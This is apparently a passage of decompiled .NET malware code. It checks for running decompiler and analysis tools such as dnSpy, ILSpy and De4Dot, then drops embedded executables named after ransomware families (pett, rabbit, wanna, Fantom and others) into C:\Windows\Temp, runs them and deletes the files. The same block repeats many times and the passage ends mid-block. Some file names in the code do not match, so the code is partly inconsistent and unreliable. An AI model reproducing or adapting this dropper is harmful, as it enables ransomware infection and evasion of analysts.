		Process[] processesByName42 = Process.GetProcessesByName("dnSpy-x86");
		Process[] processesByName43 = Process.GetProcessesByName("JustDecompiler");
		Process[] processesByName44 = Process.GetProcessesByName("ILSpy");
		Process[] processesByName45 = Process.GetProcessesByName("De4Dot");
		if (processesByName.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName2.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName3.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName4.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName5.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName6.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName7.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName8.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName9.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName10.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
